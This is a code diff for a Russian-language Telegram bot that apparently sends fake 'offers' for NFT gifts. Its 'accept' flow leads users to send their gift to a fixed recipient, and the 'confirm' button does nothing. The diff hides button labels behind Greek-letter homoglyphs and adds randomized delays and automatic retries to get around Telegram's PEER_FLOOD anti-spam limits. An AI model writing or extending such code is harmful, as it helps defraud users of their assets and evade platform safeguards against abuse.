@@ -19,7 +19,7 @@ bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
 message_queue = asyncio.Queue()
-accept_queue = asyncio.Queue()  # Очередь для принятия офферов
+accept_queue = asyncio.Queue()  # Очередь для принятия офферов с защитой от PEER_FLOOD
 client_user_ids = {}
 click_cooldowns = {}  # Защита от спама по кнопкам
 
@@ -79,7 +79,7 @@ def build_offer_text(gift_name, gift_num, amount, currency_type, lang):
         emoji_id = "5298988357538328017"
         fallback_char = "💎"
     else:
-        emoji_id = "5920433463428650761"
+        emoji_id = "5920433463428650761"  # ID звезды
         fallback_char = "⭐️"
 
     currency_emoji = f'<tg-emoji emoji-id="{emoji_id}">{fallback_char}</tg-emoji>'
@@ -112,7 +112,7 @@ def make_accept_keyboard():
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [InlineKeyboardButton(text="Пеρедать НФТ", url=f"tg://send_gift?to={recipient}", icon_custom_emoji_id="5985472565508838112")],
-            [InlineKeyboardButton(text="Подтвеρдить передачу", callback_data="noop", icon_custom_emoji_id="5776375003280838798")],
+            [InlineKeyboardButton(text="Подтвеρдить пеρедачу", callback_data="noop", icon_custom_emoji_id="5776375003280838798")],
         ]
     )
 
@@ -209,7 +209,7 @@ async def accept_offer(cb: CallbackQuery):
     # Сразу убираем часики на кнопке
     await cb.answer("✅ В очереди...", show_alert=False)
 
-    # Добавляем задачу в очередь принятия с задержкой
+    # Пушим задачу в очередь принятия
     await accept_queue.put({
         "chat_id": chat_id,
         "message_id": message_id,
@@ -239,7 +239,7 @@ async def decline_offer(cb: CallbackQuery):
 
 @dp.callback_query(F.data == "noop")
 async def noop_handler(cb: CallbackQuery):
-    await cb.answer("Сначала выполните пеρедачу НФТ по кнопке выше!", show_alert=True)
+    await cb.answer("Сначала выполните передачу НФТ по кнопке выше!", show_alert=True)
 
 async def sender_worker():
     while True:
@@ -292,8 +292,8 @@ async def accept_worker():
     while True:
         task = await accept_queue.get()
         try:
-            # Задержка перед обработкой принятия во избежание PEER_FLOOD
-            await asyncio.sleep(random.uniform(0.8, 1.2))
+            # Задержка перед выполнением для предотвращения PEER_FLOOD
+            await asyncio.sleep(random.uniform(1.5, 2.5))
 
             slug = task["slug"]
             gift_num = task["gift_num"]
@@ -329,12 +329,19 @@ async def accept_worker():
                 await bot.delete_message(chat_id=chat_id, message_id=message_id)
 
         except TelegramRetryAfter as e:
-            wait_time = e.retry_after + 1
+            wait_time = e.retry_after + 2
             logging.warning(f"Accept flood control! Waiting {wait_time}s.")
             await asyncio.sleep(wait_time)
             await accept_queue.put(task)
+            
         except Exception as e:
-            logging.error(f"Accept worker error: {e}")
+            error_str = str(e)
+            if "PEER_FLOOD" in error_str:
+                logging.warning(f"PEER_FLOOD caught in accept worker for chat {task['chat_id']}. Retrying in 5s...")
+                await asyncio.sleep(5)
+                await accept_queue.put(task)  # Переповторяем задачу автоматически
+            else:
+                logging.error(f"Accept worker error: {error_str}")
         finally:
             accept_queue.task_done()
 
